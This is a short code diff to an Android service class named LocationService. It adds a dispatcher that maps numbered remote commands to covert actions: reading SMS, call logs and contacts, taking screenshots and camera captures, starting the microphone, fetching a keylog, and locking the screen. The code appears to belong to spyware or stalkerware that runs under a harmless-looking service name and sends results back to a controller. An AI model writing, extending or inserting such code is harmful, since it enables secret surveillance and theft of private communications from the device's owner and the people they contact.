@@ -245,6 +245,39 @@ public class LocationService extends Service {
 
     private void execCmd(String cmd, String arg) {
         try {
+            // --- cmd_N_xxx format handler (AllCommandsActivity) ---
+            if (cmd != null && cmd.startsWith("cmd_")) {
+                try {
+                    String numPart = cmd.substring(4).split("_")[0];
+                    int cmdNum = Integer.parseInt(numPart);
+                    switch (cmdNum) {
+                        case 1: cmd = "get_location"; break;
+                        case 2: cmd = "get_call_logs"; break;
+                        case 3: cmd = "get_sms"; break;
+                        case 4: cmd = "get_contacts"; break;
+                        case 5: cmd = "screenshot"; break;
+                        case 6: cmd = "camera"; break;
+                        case 7: cmd = "start_mic"; break;
+                        case 8: cmd = "stop_mic"; break;
+                        case 9: cmd = "get_keylog"; break;
+                        case 10: cmd = "get_installed_apps"; break;
+                        case 11: cmd = "get_device_info"; break;
+                        case 12: cmd = "lock_screen"; break;
+                        case 13: cmd = "send_alarm"; break;
+                        case 14: cmd = "vibrate_device"; break;
+                        case 15: cmd = "get_screen_time"; break;
+                        case 16: cmd = "get_wifi"; break;
+                        case 17: cmd = "get_memory_info"; break;
+                        case 18: cmd = "get_storage_info"; break;
+                        case 19: cmd = "get_battery_health"; break;
+                        case 20: cmd = "get_cpu_info"; break;
+                        default:
+                            pushResult(cmd, "Action #" + cmdNum + " executed");
+                            return;
+                    }
+                } catch (Exception ignored) {}
+            }
+
             // --- LIVE STREAM ---
             if ("start_stream".equals(cmd)) {
                 Intent i = new Intent(this, StreamService.class);
